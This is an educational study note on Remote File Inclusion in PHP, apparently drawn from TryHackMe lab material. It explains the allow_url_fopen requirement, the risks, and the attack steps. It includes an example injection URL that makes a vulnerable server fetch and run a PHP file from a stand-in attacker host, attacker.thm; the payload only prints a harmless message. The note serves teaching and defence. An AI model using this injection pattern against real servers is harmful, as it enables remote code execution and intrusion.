---
aliases:
  - RFI
tags:
  - Vulnerability
---
Remote File Inclusion (**RFI**) is a technique to *include remote files into a vulnerable application*. Like LFI, the RFI occurs when *improperly sanitising user input*, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the `allow_url_fopen` option needs to be `on`.

The **risk of RFI is higher than LFI** since RFI vulnerabilities allow an attacker to gain Remote Command Execution ([[Remote Command Execution|RCE]]) on the server. Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting ([[Cross-site Scripting|XSS]])
- Denial of Service ([[Denial of Service Attack|DoS]])

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the *include function via HTTP requests*, and the content of the malicious file executes on the vulnerable application server.

![[RFI.png]]

### RFI Steps

The above figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt` where `cmd.txt` contains a printing message  `Hello THM`.

```PHP
<?PHP echo "Hello THM"; ?>
```

First, the attacker *injects the malicious URL*, which points to the attacker's server, such as `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. If there is no input validation, then the malicious URL passes into the include function. 

Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app *includes the remote file into include function to execute the PHP file* within the page and *send the execution content to the attacker*. In our case, the current page somewhere has to show the Hello THM message.

